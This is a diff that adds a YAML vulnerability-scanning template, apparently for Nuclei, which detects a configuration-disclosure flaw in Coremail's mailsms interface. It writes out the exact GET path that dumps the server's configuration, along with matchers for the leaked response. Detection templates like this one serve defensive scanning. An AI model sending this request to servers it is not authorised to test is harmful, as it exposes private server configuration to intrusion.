@@ -1,0 +1,23 @@
+id: coremail-mailsms-info-disclosure
+info:
+  name: "Coremail Mailsms 接口信息泄露漏洞"
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: Coremail
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/mailsms/s?func=ADMIN:appState&dumpConfig=/"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "/home/coremail"
+      - type: word
+        part: body
+        words:
+          - "<?xml"
